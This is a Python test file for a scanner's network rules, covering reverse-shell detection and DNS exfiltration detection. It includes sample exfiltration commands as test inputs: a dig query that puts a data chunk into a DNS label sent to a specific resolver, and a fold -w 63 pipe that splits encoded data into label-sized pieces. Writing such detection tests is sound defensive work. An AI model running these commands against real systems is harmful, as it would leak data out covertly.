"""Tests for network rules."""

from waingro.rules.network import DnsExfiltration, ReverseShell


def test_net_001_reverse_shell(malicious_reverse_shell):
    rule = ReverseShell()
    findings = rule.evaluate(malicious_reverse_shell)
    assert len(findings) >= 1
    assert findings[0].rule_id == "NET-001"
    assert findings[0].severity.value == "critical"


def test_net_001_clean(clean_basic_skill):
    rule = ReverseShell()
    findings = rule.evaluate(clean_basic_skill)
    assert len(findings) == 0


def test_net_004_dig_exfil(make_inline_skill):
    """NET-004 detects dig with variable interpolation in DNS labels."""
    skill = make_inline_skill(
        body='dig "${CHUNK}.data.example.com" @198.51.100.1 +short'
    )
    findings = DnsExfiltration().evaluate(skill)
    assert len(findings) >= 1
    assert findings[0].rule_id == "NET-004"


def test_net_004_fold_w63(make_inline_skill):
    """NET-004 detects fold -w 63 as DNS label splitting indicator."""
    skill = make_inline_skill(body="echo $ENCODED | fold -w 63")
    findings = DnsExfiltration().evaluate(skill)
    assert len(findings) >= 1
    assert findings[0].rule_id == "NET-004"


def test_net_004_clean(make_inline_skill):
    """NET-004 does not fire on normal dig usage."""
    skill = make_inline_skill(body="dig example.com\nnslookup example.com")
    findings = DnsExfiltration().evaluate(skill)
    assert len(findings) == 0
